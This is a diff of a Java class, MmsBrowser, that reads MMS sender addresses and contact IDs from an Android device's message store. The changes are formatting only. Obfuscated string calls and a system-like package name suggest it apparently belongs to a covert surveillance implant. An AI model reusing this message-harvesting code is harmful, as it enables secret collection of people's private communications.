@@ -9,20 +9,20 @@
 
 package com.android.syssetup.module.message;
 
+import android.database.Cursor;
+import android.net.Uri;
+
+import com.android.mm.M;
+import com.android.syssetup.Status;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.util.Check;
+
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.text.MessageFormat;
 import java.util.ArrayList;
-
-import android.database.Cursor;
-import android.net.Uri;
-
-import com.android.syssetup.Status;
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 public class MmsBrowser {
 	private static final String TAG = "MmsBrowser"; //$NON-NLS-1$
@@ -52,8 +52,8 @@ public class MmsBrowser {
 		// 13.2=address
 		// 13.3=contact_id
 		// 13.4=charset
-		final String[] projection = new String[] {
-				M.e("address"), M.e("contact_id"), M.e("charset"), M.e("type") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+		final String[] projection = new String[]{
+				M.e("address"), M.e("contact_id"), M.e("charset"), M.e("type")}; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 		// 13.5=type
 		// 13.6=137
 		final String selection = M.e("type") + "=" + M.e("137"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
@@ -207,7 +207,7 @@ public class MmsBrowser {
 	}
 
 	private String getAddressNumber(String id) {
-		String selectionAdd = new String(M.e("msg_id")+"=" + id); //$NON-NLS-1$
+		String selectionAdd = new String(M.e("msg_id") + "=" + id); //$NON-NLS-1$
 		String uriStr = MessageFormat.format(M.e("content://mms/{0}/addr"), id); //$NON-NLS-1$
 		Uri uriAddress = Uri.parse(uriStr);
 		Cursor cAdd = Status.getAppContext().getContentResolver().query(uriAddress, null, selectionAdd, null, null);
